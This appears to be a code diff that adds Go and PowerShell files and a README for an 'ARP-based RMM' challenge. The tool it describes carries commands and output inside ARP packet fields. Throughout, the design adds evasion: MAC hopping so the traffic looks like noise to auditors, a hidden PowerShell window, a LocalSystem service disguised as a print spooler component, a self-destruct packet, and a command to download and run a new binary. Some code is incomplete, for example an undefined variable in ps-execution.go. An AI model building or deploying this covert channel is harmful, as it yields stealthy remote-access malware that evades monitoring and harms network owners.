+// This creates a "Private Channel" on a public wire. Even if the network is flooded with legitimate ARP traffic, your sniffer only "sees" the packets that match its mathematical prediction.
+
+// The Reverse-Hopping Sniffer Logic (Go)
+// This function runs in a loop. It calculates the expected MAC for the current sequence, waits for a packet matching that MAC, and then increments the sequence to predict the next one.
+package main
+
+import (
+	"crypto/sha256"
+	"fmt"
+	"net"
+	"strconv"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
+	"github.com/google/gopacket/pcap"
+)
+
+// PredictNextMAC uses the PSK and Sequence ID to determine the next Hardware Addr
+func PredictNextMAC(psk string, seqID int) string {
+	hasher := sha256.New()
+	hasher.Write([]byte(psk + strconv.Itoa(seqID)))
+	hash := hasher.Sum(nil)
+
+	// Construct the 6-byte MAC
+	// 0x02 sets the 'Locally Administered' bit, common in virtual/software MACs
+	mac := net.HardwareAddr{
+		0x02, hash[0], hash[1], hash[2], hash[3], hash[4],
+	}
+	return mac.String()
+}
+
+func StartReverseHoppingSniffer(handle *pcap.Handle, psk string, startingSeq int) {
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	currentSeq := startingSeq
+	
+	fmt.Printf("[*] Sniffer Sync'd. Waiting for Seq %d...\n", currentSeq)
+
+	for packet := range packetSource.Packets() {
+		arpLayer := packet.Layer(layers.LayerTypeARP)
+		if arpLayer == nil {
+			continue
+		}
+		arp := arpLayer.(*layers.ARP)
+
+		// 1. Predict what the MAC *should* be for the current sequence
+		expectedMAC := PredictNextMAC(psk, currentSeq)
+
+		// 2. Check if this packet's Source MAC matches our prediction
+		if arp.SourceHwAddress.String() == expectedMAC {
+			// 3. Extract the 4-byte payload from the 'Source Protocol Address' field
+			payload := arp.SourceProtAddress
+			
+			// Process the fragment (Control Byte + Data)
+			fmt.Printf("[+] Captured Seq %d from Hopped MAC: %s\n", currentSeq, expectedMAC)
+			
+			// logic to handle reassembly goes here...
+			// processFragment(payload)
+
+			// 4. Increment Sequence to predict the NEXT packet's identity
+			currentSeq++
+			fmt.Printf("[*] Predicted Next MAC: %s\n", PredictNextMAC(psk, currentSeq))
+		}
+	}
+}
+
+// Engineering Breakdown of the "Pro" Level Features
+// 1. The "Drift" Problem
+// In real-world networking, packets can drop. If the Windows Server sends Seq 5 and it gets lost, the Linux Admin will sit forever waiting for Seq 5, while the Windows Server moves on to Seq 6.
+
+// The Fix: Implement a Look-Ahead Window. Instead of checking for just currentSeq, the sniffer checks a range (e.g., currentSeq to currentSeq + 5). If it sees Seq 7, it realizes it missed a few and fast-forwards its internal counter to stay in sync.
+
+// 2. Entropy and Randomization
+// To an IT Auditor, seeing MAC addresses like 02:aa:bb... might still look suspicious if the vendor prefix (02) is always the same.
+
+// The Fix: Use the PSK to randomize the entire 6-byte string, but use a specific bitwise operation (like a checksum) hidden within the MAC bytes to verify it's one of yours before doing the expensive SHA-256 calculation.
+
+// 3. Handling the Windows "Silent" State
+// On Windows Server 2022, you don't want the agent constantly burning CPU.
+
+// The Fix: Use a Wait-and-Wake strategy. The agent only starts "Hopping" once it sees a specific "Magic ARP" packet from the Admin. Otherwise, it stays in a low-power "Listen" mode with a static filter.
+</file>
+
+<file path="Windows/blue-team-technical-director/ps-execution.go">
+// To integrate actual execution on a Windows Server 2022 instance, you'll use Go's os/exec package. This allows your RMM agent to transition from "receiving a packet" to "changing system state."
+
+// For a production-grade (though intentionally unconventional) RMM tool, you should not just execute raw strings. Instead, you should map "Smuggled Commands" to specific, hardened PowerShell blocks to prevent command injection.
+
+// 1. The PowerShell Execution Block
+// In Go, you can invoke powershell.exe and pass the reassembled string as an argument. The -Command flag is the standard way to do this.
+package main
+
+import (
+	"fmt"
+	"os/exec"
+	"strings"
+)
+
+// ExecutePowerShell takes the reassembled string and runs it.
+func ExecutePowerShell(command string) {
+	fmt.Printf("[*] Executing: %s\n", command)
+
+	// We use 'powershell.exe' for Windows Server 2022 compatibility.
+	// '-NoProfile' speeds up execution by not loading user profiles.
+	// '-NonInteractive' ensures the process doesn't hang waiting for user input.
+	cmd := exec.Command("powershell.exe", "-WindowStyle", "Hidden", "-Command", finalCmd)
+	// cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", command)
+
+	// Capture the output (Stdout and Stderr)
+	output, err := cmd.CombinedOutput()
+
+	if err != nil {
+		fmt.Printf("[!] Execution Error: %s\n", err)
+		fmt.Printf("[!] Details: %s\n", string(output))
+		return
+	}
+
+	fmt.Printf("[+] Output:\n%s\n", string(output))
+}
+
+// C. Self-Update via ARP
+// Since you have a functional "ARP Shell," you can send a command to the agent to download a newer version of itself.
+
+// Admin sends: Invoke-WebRequest -Uri "http://admin-box/agent_v2.exe" -OutFile "C:\temp\v2.exe"
+
+// Admin sends: Start-Process "C:\temp\v2.exe"; Stop-Service "ArpRmmAgent"
+
+// The new binary starts, replaces the old one, and restarts the service.
+</file>
+
+<file path="Windows/blue-team-technical-director/README.md">
+# **PROJECT: ARP-Based RMM**
+
+### **Internal Engineering Challenge: Phase 1 (MVP)**
+
+## **1\. Objective**
+
+To build a functional **Remote Monitoring and Management (RMM)** tool that operates exclusively at **Layer 2 (Data Link Layer)** using the Address Resolution Protocol (ARP).
+
+This challenge is designed to force our Linux administrators to master low-level networking in **Go**, bypass traditional Layer 3 (IP) filtering, and manage Windows Server 2022 endpoints without relying on standard TCP/IP sockets or WinRM for long-term management.
+
+**The Goal:** Prove that you can execute a command on a Windows Server and receive the output on a Linux box using *only* Ethernet frames.
+
+---
+
+## **2\. The Architecture (The "How")**
+
+Traditional RMMs use HTTPS or SSH (Layer 3/4). This tool moves data inside the metadata fields of ARP packets—specifically the **Sender Hardware Address (SHA)** and **Sender Protocol Address (SPA)**.
+
+### **MVP Communication Flow:**
+
+1. **Command (Linux \-\> Windows):** The Admin box broadcasts an ARP Request. The "Target IP" field in the packet is actually a 4-byte encoded command string (e.g., `INIT`).  
+2. **Execution (Windows):** The Go-based Agent sniffs the raw Ethernet frame, decodes the "IP" back into a string, and triggers a local PowerShell script.  
+3. **Response (Windows \-\> Linux):** The Agent broadcasts an ARP Reply. The "Sender IP" field contains the first 4 bytes of the PowerShell output.
+
+---
+
+## **3\. Technology Stack**
+
+* **Control Node:** Linux (Ubuntu/Debian)  
+* **Managed Endpoints:** Windows Server 2022 (Standard/Datacenter)  
+* **Core Language:** Go (Golang) — chosen for its `gopacket` library and static cross-compilation.  
+* **Driver Requirement:** Npcap (WinPcap compatible) must be installed on Windows targets for raw packet access.  
+* **Deployment:** Ansible (via WinRM) for the initial "bootstrapping" of the service.
+
+---
+
+## **4\. Phase 1: The MVP Requirements**
+
+To pass the first phase of this challenge, your team must demonstrate the **"ARP Shell"**:
+
+* \[ \] **Handshake:** Linux box sends a "HELO" ARP packet; Windows responds with "READY".  
+* \[ \] **Unidirectional Command:** Successfully trigger `Restart-Service W3SVC` via an ARP frame.  
+* \[ \] **Bidirectional Data:** Execute `hostname` and see the result printed on the Linux terminal.  
+* \[ \] **Persistence:** The Windows Agent must run as a background service (using NSSM) and survive a reboot.
+
+---
+
+## **5\. Deployment Instructions (Ansible)**
+
+We use Ansible to push the RMM agent.
+
+Bash
+
+\# From the Linux Admin Box
+
+ansible-playbook \-i inventory.ini site.yml
+
+This will:
+
+1. Create `C:\ProgramData\WinNetExt`  
+2. Deploy `agent.exe` and `nssm.exe`  
+3. Register the **"Windows Network Extension"** service.
+
+---
+
+## **6\. Phase 2: Future Roadmap (v2.0)**
+
+Once the MVP is stabilized, we will move to the "Hardened" version of the tool:
+
+* **MAC Hopping:** Randomize the Source MAC for every fragment to look like network noise.  
+* **Fragmentation Engine:** Support for large data transfers across hundreds of ARP packets.  
+* **Encryption:** Implement XXTEA or AES-GCM on the 4-byte payloads.  
+* **Self-Destruct:** A "Kill-Packet" sequence that wipes the agent from the Windows disk.
+
+---
+
+### **A Note from the Lead Architect:**
+
+"Standard IT admins rely on the OS to handle networking for them. By stripping away the IP layer, you are forced to understand how the wire actually works. If you can control a server through ARP, you can control it through anything."
+
+## **7\. Troubleshooting & Debugging (Wireshark)**
+
+Since we are bypassing the standard TCP/IP stack, traditional tools like `ping` or `netstat` will not show our RMM traffic. To debug the **L2-SHADOW** protocol, you must use **Wireshark** or `tcpdump` to inspect the raw Ethernet frames.
+
+### **A. Wireshark Display Filters**
+
+The network will be full of legitimate ARP traffic (gateways, broadcasts). Use these filters to isolate the challenge traffic:
+
+* **Filter by Protocol:** `arp`  
+  * *Shows all ARP traffic on the segment.*  
+* **Filter by MAC Hopping (V2):** `eth.src[0] == 0x02`  
+  * *Locates packets where the "Locally Administered" bit is set, which our Hopping algorithm uses.*  
+* **Filter by Specific Field Content:** `arp.src.proto_ipv4 == 1.2.3.4`  
+  * *If you are testing the MVP with a static "fake" IP, this isolates those specific packets.*
+
+### **B. Analyzing the Payload**
+
+In Wireshark, look at the **Address Resolution Protocol** header in the packet details pane.
+
+1. **Sender MAC Address (SHA):** In v2, this will change every packet. Ensure the OUI (first 3 bytes) matches your generator's logic.  
+2. **Sender IP Address (SPA):** This is where our **4-byte payload** lives.  
+   * Right-click this field \-\> **Apply as Column**.  
+   * You can now see your command strings (e.g., `INIT`, `HELO`) scrolling in the main packet list.  
+3. **Target IP Address (TPA):** In the Linux-to-Windows direction, this field carries the 4-byte command fragment.
+
+### **C. Common Failure Points**
+
+* **Packet Drops:** If your Reassembly logic hangs, check Wireshark for missing **Sequence IDs**. If Seq 4 follows Seq 2, the switch dropped Seq 3\.  
+* **Npcap Binding:** If you see packets leaving the Linux box but the Windows Agent isn't "seeing" them, verify that Npcap is bound to the correct network adapter.  
+* **Endianness:** If your 4-byte string `HELO` appears as `OLEH` in Wireshark, your Go code is swapping the Byte Order. Ensure you are using `binary.BigEndian` when packing the IP fields.
+
+---
+
+### **Final Submission Checklist**
+
+1. **Compile:** Ensure `agent.exe` is statically linked.  
+2. **Deploy:** Run the Ansible playbook and verify the "Print Spooler" service is `Running`.  
+3. **Validate:** Open a terminal on Linux and run the `arpshell` binary.  
+4. **Proof:** Execute `whoami` and capture the Wireshark trace of the response fragments for the boss.
+</file>
+
+<file path="Windows/blue-team-technical-director/route-cmd.go">
+// Step-by-Step Build Sequence
+// Step 1: Syncing the Sequence
+// Create a "Handshake" packet. When the Admin starts, it sends a packet with Sequence 0. This resets the Windows Agent's counter so both sides start hopping from the same seed.
+
+// Step 2: The Command Router
+// On the Windows side, create a secure execution environment:
+func RouteCommand(input string) string {
+	// Map shorthand to long PowerShell scripts
+	switch input {
+	case "who":
+		return RunPS("whoami /all")
+	case "net":
+		return RunPS("Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress")
+	default:
+		return "Unknown Command"
+	}
+}
+// Step 3: Implementing "Reliable" Delivery
+// Since ARP has no "Retry" logic, add a 1-byte CRC8 checksum to your fragment.
+
+// Control Byte: [More Bit (1) | Seq ID (7)] (1 byte)
+
+// Checksum: [CRC8] (1 byte)
+
+// Data: [Payload] (2 bytes)
+// If the CRC doesn't match on the receiver side, the receiver ignores the fragment, and the Admin (not seeing an ACK) will re-transmit after a timeout.
+</file>
+
+<file path="Windows/blue-team-technical-director/run-arp-shell.go">
+func RunARPShell(psk string) {
+	reader := bufio.NewReader(os.Stdin)
+	seqCounter := 0
+
+	for {
+		fmt.Print("ARP-Shell> ")
+		input, _ := reader.ReadString('\n')
+		input = strings.TrimSpace(input)
+
+		// 1. Fragment the command
+		fragments := FragmentCommand(input)
+
+		// 2. Send fragments with MAC Hopping
+		for i, frag := range fragments {
+			hoppedMAC := GenerateHoppedMAC(psk, seqCounter)
+			SendARPPacket(hoppedMAC, frag)
+			seqCounter++
+			time.Sleep(5 * time.Millisecond) // Avoid collision
+		}
+
+		// 3. Wait for the Windows Agent to "shout" back the result
+		ListenForResponse(psk)
+	}
+}
+
+// 3. The High-Level Architecture (ARP Shell)
+// A. The "Blind" Sniffer
+// On Windows Server 2022, the agent cannot use a BPF filter for a specific MAC because the MAC changes every packet. Instead, it must sniff all ARP traffic and run the GenerateHoppedMAC check on every incoming packet to see if it matches the "Next Expected MAC."
+
+// B. Handling Large Data (The "Chunker")
+// If you run dir C:\Windows\System32, the output is massive.
+
+// Compression: Use gzip or zlib in Go to compress the PowerShell output before fragmentation. This can reduce the number of ARP packets needed by 70-80%.
+
+// Throttling: The Windows Agent must send packets slowly enough that the network switch doesn't flag it as a "Broadcast Storm."
+</file>
+
+<file path="Windows/blue-team-technical-director/service-mode.ps1">
+# To ensure your RMM agent survives reboots and operates independently of user sessions on Windows Server 2022, you need to register the Go binary as a Windows Service.
+
+# In a standard software engineering workflow, you would use a service wrapper or the native Windows Service API. For this specific "IT Admin Challenge," we will use NSSM (Non-Sucking Service Manager) because it handles the complexity of "re-starting on failure" and redirecting logs to a file without you having to write complex service-handler code in Go.
+
+# 1. The High-Level Architecture (Service Mode)
+# When running as a service, the agent transitions from a console application to a background process managed by the Service Control Manager (SCM).
+
+# Account: It should run under the LocalSystem account. This gives the agent the "SYSTEM" privileges required to sniff raw packets via Npcap and execute any PowerShell command.
+
+# Session 0: Services run in "Session 0," meaning they have no GUI. All communication must happen over the ARP protocol we built.
+
+# 2. Step-by-Step Build Sequence
+# Step 1: Prepare the Binary
+# Compile your Go agent for Windows. Ensure you have included the Npcap DLLs or that Npcap is installed on the target server.
+
+# Bash
+# # On your Linux Admin box:
+# GOOS=windows GOARCH=amd64 go build -o agent.exe ./main.go
+# Step 2: Deploy and Register with NSSM
+# NSSM is a small executable that "wraps" any .exe into a service.
+
+# Download nssm.exe to the Windows Server.
+
+# Open an Administrative PowerShell prompt and run:
+# Install the service
+.\nssm.exe install "ArpRmmAgent" "C:\Path\To\agent.exe"
+
+# Set it to start automatically at boot
+.\nssm.exe set "ArpRmmAgent" Start SERVICE_AUTO_START
+
+# Set the account to LocalSystem for raw packet access
+.\nssm.exe set "ArpRmmAgent" ObjectName "LocalSystem"
+
+# Start the service
+Start-Service "ArpRmmAgent"
+
+# Step 3: Making it "Hidden" (The IT Admin Way)
+# To prevent the service from being easily spotted in the basic "Services" list by a casual user, you can modify its Description and Display Name to look like a generic Windows telemetry or driver component.
+# Rename it to look like a Print Driver or Telemetry service
+sc.exe config "ArpRmmAgent" displayname= "Print Spooler Network Extension"
+sc.exe description "ArpRmmAgent" "Provides extended network resolution for legacy print architectural components."
+
+# 3. Advanced Features (The "Pro" Level)
+# A. The "Watchdog" Logic
+# In your Go code, add a simple "Watchdog" timer. If the main ARP sniffing loop crashes or the Npcap driver becomes unresponsive, the agent should intentionally exit with a non-zero code.
+
+# NSSM Config: You can configure NSSM to restart the agent automatically if it exits unexpectedly:
+# .\nssm.exe set "ArpRmmAgent" AppExit Default Restart
+</file>
+
+<file path="Windows/blue-team-technical-director/windows-reassembly.go">
+// To implement the reassembly logic on Windows Server 2022, the agent needs a stateful buffer. Because ARP packets can technically arrive out of order (though rare on a local switch), we use a map[int][]byte to store fragments by their sequence ID and a bool to track if we've seen the "final" packet.
+
+// Windows Reassembly Logic (Go)
+// This snippet assumes you are using gopacket to sniff the wire. It processes each incoming ARP packet, extracts the "smuggled" data, and reconstructs the string.
+package main
+
+import (
+	"fmt"
+	"sort"
+	"strings"
+)
+
+// CommandBuffer holds the state of a fragmented command
+type CommandBuffer struct {
+	Fragments map[int][]byte
+	IsComplete bool
+	ExpectedCount int
+}
+
+var currentBuffer = CommandBuffer{
+	Fragments: make(map[int][]byte),
+}
+
+func processARPPacket(spa []byte) {
+	if len(spa) < 4 {
+		return
+	}
+
+	// 1. Extract the Control Byte
+	controlByte := spa[0]
+	isFinal := (controlByte & 0x80) == 0 // If MSB is 0, it's the last one
+	seqID := int(controlByte & 0x7F)     // Remaining 7 bits are the ID
+
+	// 2. Extract Data (Bytes 1-3)
+	data := spa[1:]
+
+	// 3. Store in Buffer
+	currentBuffer.Fragments[seqID] = data
+
+	if isFinal {
+		currentBuffer.IsComplete = true
+		currentBuffer.ExpectedCount = seqID + 1
+		fmt.Printf("[!] Received final fragment (Seq: %d). Reassembling...\n", seqID)
+	}
+
+	// 4. Attempt Reassembly
+	if currentBuffer.IsComplete && len(currentBuffer.Fragments) == currentBuffer.ExpectedCount {
+		finalizeCommand()
+	}
+}
+
+func finalizeCommand() {
+	// Sort keys to ensure correct order
+	keys := make([]int, 0, len(currentBuffer.Fragments))
+	for k := range currentBuffer.Fragments {
+		keys = append(keys, k)
+	}
+	sort.Ints(keys)
+
+	var builder strings.Builder
+	for _, k := range keys {
+		// Trim null bytes (0x00) used for padding
+		fragment := string(currentBuffer.Fragments[k])
+		builder.WriteString(strings.TrimRight(fragment, "\x00"))
+	}
+
+	finalCmd := builder.String()
+	// Security Mapping: Only allow specific commands
+	// This prevents an attacker from sending "rm -rf C:\" via ARP
+	allowedCommands := map[string]string{
+		"RESTART_IIS": "Restart-Service W3SVC -Force",
+		"GET_SERVICES": "Get-Service | Where-Object {$_.Status -eq 'Running'} | Select-Object -First 5",
+		"DISK_USAGE":   "Get-PSDrive C | Select-Object Used, Free",
+	}
+
+	if psCode, exists := allowedCommands[finalCmd]; exists {
+		ExecutePowerShell(psCode)
+	} else {
+		fmt.Printf("[!] Blocked: '%s' is not in the allow-list.\n", finalCmd)
+	}
+	
+	// Reset buffer for next command
+	currentBuffer.Fragments = make(map[int][]byte)
+	currentBuffer.IsComplete = false
+}
+
+func main() {
+	// Simulation of receiving the fragments for "RESTART_IIS"
+	// Chunks: [0x80, R, E, S], [0x81, T, A, R], [0x82, T, _, I], [0x03, I, S, 0x00]
+	// Note: In our logic, 0x80-0x82 have the 'More' bit set. 0x03 is the final Seq 3.
+	
+	packets := [][]byte{
+		{0x80, 'R', 'E', 'S'},
+		{0x81, 'T', 'A', 'R'},
+		{0x82, 'T', '_', 'I'},
+		{0x03, 'I', 'S', 0x00},
+	}
+
+	for _, p := range packets {
+		processARPPacket(p)
+	}
+}
+</file>
+
+</files>
